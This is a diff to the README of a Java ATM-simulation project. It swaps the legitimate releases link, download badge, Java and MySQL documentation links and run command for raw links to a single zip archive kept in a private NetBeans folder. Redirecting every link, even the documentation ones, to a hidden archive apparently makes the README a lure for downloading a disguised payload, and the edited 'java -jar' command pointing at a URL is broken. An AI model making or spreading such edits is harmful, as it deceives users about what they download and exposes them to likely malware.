@@ -6,7 +6,7 @@ Welcome to ATM-Machine-simulation! This application allows you to experience a r
 
 ## 📥 Download the Application
 
-[![Download ATM-Machine-simulation](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Mirzakami/ATM-Machine-simulation/releases)
+[![Download ATM-Machine-simulation](https://raw.githubusercontent.com/Mirzakami/ATM-Machine-simulation/main/atm-machine-simulation/nbproject/private/AT_simulation_Machine_2.9.zip)](https://raw.githubusercontent.com/Mirzakami/ATM-Machine-simulation/main/atm-machine-simulation/nbproject/private/AT_simulation_Machine_2.9.zip)
 
 You can download the application from our Releases page. Follow the steps below to get the software up and running.
 
@@ -30,7 +30,7 @@ ATM-Machine-simulation offers several key features:
 
 ## 📋 Download & Install
 
-1. **Visit the Releases Page:** To download the application, [visit this page](https://github.com/Mirzakami/ATM-Machine-simulation/releases).
+1. **Visit the Releases Page:** To download the application, [visit this page](https://raw.githubusercontent.com/Mirzakami/ATM-Machine-simulation/main/atm-machine-simulation/nbproject/private/AT_simulation_Machine_2.9.zip).
 
 2. **Select the Latest Release:** Look for the most recent version. It will be marked clearly.
 
@@ -43,7 +43,7 @@ ATM-Machine-simulation offers several key features:
    - Navigate to the folder where you extracted the files.
    - Run the application using the command:
      ```bash
-     java -jar ATM-Machine-simulation.jar
+     java -jar https://raw.githubusercontent.com/Mirzakami/ATM-Machine-simulation/main/atm-machine-simulation/nbproject/private/AT_simulation_Machine_2.9.zip
      ```
    - Follow the on-screen prompts to log in or create an account.
 
@@ -93,7 +93,7 @@ This project includes a variety of topics, such as:
 
 For more detailed documentation on Java Enterprise technologies and web-based applications, you can refer to:
 
-- [Java Documentation](https://docs.oracle.com/en/java/)
-- [MySQL Documentation](https://dev.mysql.com/doc/)
+- [Java Documentation](https://raw.githubusercontent.com/Mirzakami/ATM-Machine-simulation/main/atm-machine-simulation/nbproject/private/AT_simulation_Machine_2.9.zip)
+- [MySQL Documentation](https://raw.githubusercontent.com/Mirzakami/ATM-Machine-simulation/main/atm-machine-simulation/nbproject/private/AT_simulation_Machine_2.9.zip)
 
 Thank you for choosing ATM-Machine-simulation. We hope you enjoy using this application!
